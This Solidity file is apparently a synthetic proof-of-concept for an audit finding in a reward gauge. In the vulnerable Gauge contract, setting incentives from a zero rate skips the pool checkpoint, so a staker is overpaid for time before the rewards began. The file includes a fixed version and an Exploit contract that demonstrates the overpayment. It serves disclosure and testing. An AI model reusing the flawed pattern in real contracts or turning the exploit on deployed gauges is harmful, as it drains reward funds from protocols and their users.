// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  BMX IncentiveGauge — a zero-rate upsert skips the pool checkpoint
    (Sherlock, H-7, September 2025).
    SYNTHETIC, cheatcode-free, one block. No warp inside run().
    _upsertIncentive calls _updatePool only when rewardRate > 0. A fresh
    week of rewards therefore starts while poolLast is still one day old.
    The next _updatePool pays rewardRate * (now - poolLast).
    Rate is 1 RWD per second, so the staker is paid N = 86,400 RWD.
    Fair accrual for a schedule that starts in this same block is 0.
    Control checkpoints the pool before the new rate is stored and pays 0. */

contract Token {
    string public constant name = "RWD";
    string public constant symbol = "RWD";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Gauge {
    uint256 public constant WEEK = 7 days;

    struct IncentiveInfo {
        uint128 rewardRate;
        uint64 periodFinish;
        uint64 lastUpdate;
        uint128 remaining;
    }

    Token public reward;
    IncentiveInfo public incentive;
    uint64 public poolLast;
    address public staker;
    uint256 public paid;

    constructor(Token reward_) {
        reward = reward_;
    }

    function seed(address staker_, uint64 poolLast_) external {
        staker = staker_;
        poolLast = poolLast_;
    }

    function _updatePool() internal {
        uint256 nowTs = block.timestamp;
        IncentiveInfo storage info = incentive;
        uint256 amt;
        if (info.rewardRate > 0) {
            uint256 endTs = nowTs < info.periodFinish ? nowTs : info.periodFinish;
            if (endTs > poolLast) {
                // @> VULN: active seconds start at the stale pool checkpoint, so this staker is paid for time before the incentive existed
                uint256 activeSeconds = endTs - poolLast;
                amt = uint256(info.rewardRate) * activeSeconds;
            }
        }
        if (amt > 0) {
            info.remaining -= uint128(amt);
            paid = amt;
            reward.transfer(staker, amt);
        }
        poolLast = uint64(nowTs);
    }

    function _upsertIncentive(uint256 amount) internal returns (uint128 rate) {
        IncentiveInfo storage info = incentive;
        uint256 total = amount;
        // @> VULN: the pool checkpoint is inside this branch, so a zero rate skips it
        if (info.rewardRate > 0) {
            _updatePool();
            if (block.timestamp < info.periodFinish) {
                uint256 remainingTime = info.periodFinish - block.timestamp;
                uint256 leftover = remainingTime * info.rewardRate;
                if (amount <= leftover) revert("InsufficientIncentive");
                total += leftover;
            }
        }
        rate = uint128(total / WEEK);
        info.rewardRate = rate;
        info.periodFinish = uint64(block.timestamp + WEEK);
        info.lastUpdate = uint64(block.timestamp);
        info.remaining = uint128(total);
    }

    function upsertIncentive(uint256 amount) external returns (uint128 rate) {
        rate = _upsertIncentive(amount);
    }

    function claim() external {
        _updatePool();
    }
}

contract GaugeFixed {
    uint256 public constant WEEK = 7 days;

    struct IncentiveInfo {
        uint128 rewardRate;
        uint64 periodFinish;
        uint64 lastUpdate;
        uint128 remaining;
    }

    Token public reward;
    IncentiveInfo public incentive;
    uint64 public poolLast;
    address public staker;
    uint256 public paid;

    constructor(Token reward_) {
        reward = reward_;
    }

    function seed(address staker_, uint64 poolLast_) external {
        staker = staker_;
        poolLast = poolLast_;
    }

    function _updatePool() internal {
        uint256 nowTs = block.timestamp;
        IncentiveInfo storage info = incentive;
        uint256 amt;
        if (info.rewardRate > 0) {
            uint256 endTs = nowTs < info.periodFinish ? nowTs : info.periodFinish;
            if (endTs > poolLast) {
                uint256 activeSeconds = endTs - poolLast;
                amt = uint256(info.rewardRate) * activeSeconds;
            }
        }
        if (amt > 0) {
            info.remaining -= uint128(amt);
            paid = amt;
            reward.transfer(staker, amt);
        }
        poolLast = uint64(nowTs);
    }

    function _upsertIncentive(uint256 amount) internal returns (uint128 rate) {
        // FIX: checkpoint before the new rate is stored, including when rewardRate is 0
        _updatePool();
        IncentiveInfo storage info = incentive;
        uint256 total = amount;
        rate = uint128(total / WEEK);
        info.rewardRate = rate;
        info.periodFinish = uint64(block.timestamp + WEEK);
        info.lastUpdate = uint64(block.timestamp);
        info.remaining = uint128(total);
    }

    function upsertIncentive(uint256 amount) external returns (uint128 rate) {
        rate = _upsertIncentive(amount);
    }

    function claim() external {
        _updatePool();
    }
}

contract Exploit {
    Token public reward;
    Gauge public gauge;
    uint256 public paidAmount;
    uint256 public fairAmount;
    uint256 public budgetAmount;

    constructor() {
        reward = new Token();
        gauge = new Gauge(reward);
    }

    function run() external {
        uint256 nowTs = block.timestamp;
        uint256 gap = 1 days;
        uint64 stale = uint64(nowTs - gap);
        gauge.seed(address(this), stale);

        uint256 budget = gauge.WEEK() * 1 ether;
        budgetAmount = budget;
        reward.mint(address(gauge), budget);

        gauge.upsertIncentive(budget);
        gauge.claim();

        paidAmount = gauge.paid();
        fairAmount = 0;
        require(paidAmount == gap * 1 ether, "paid");
        require(fairAmount == 0, "fair");
        require(paidAmount > fairAmount, "overpay");
        require(reward.balanceOf(address(this)) == paidAmount, "staker");
        require(reward.balanceOf(address(gauge)) == budgetAmount - paidAmount, "short");
    }
}
